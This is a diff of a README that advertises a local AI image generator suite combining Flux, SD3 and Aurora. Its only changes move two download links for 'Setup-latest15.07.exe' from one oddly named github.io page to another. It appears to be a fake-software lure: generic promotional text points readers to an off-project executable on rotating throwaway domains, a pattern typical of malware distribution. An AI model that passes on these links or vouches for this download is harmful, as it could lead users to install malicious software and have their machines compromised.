@@ -2,7 +2,7 @@
 
 This comprehensive local toolkit brings together the power of Flux, Stable Diffusion 3 (SD3), and Aurora image generation models into a single, easy-to-use application. Designed for artists and developers, it provides the ultimate ai image generator suite for creating stunning visuals locally on your machine.
 
-[![Download Suite](https://img.shields.io/badge/Download-Suite-v2.5-blue?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Suite](https://img.shields.io/badge/Download-Suite-v2.5-blue?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -38,4 +38,4 @@ A: First, ensure your GPU drivers are up to date. If the issue persists, try run
 
 Get the latest version of the complete suite from the official source.
 
-[Download the Flux / SD3 / Aurora Suite (Setup-latest15.07.exe)](https://yellowtaxisave.github.io/download-page/)
+[Download the Flux / SD3 / Aurora Suite (Setup-latest15.07.exe)](https://capitals-707-bringing.github.io/download-page/)
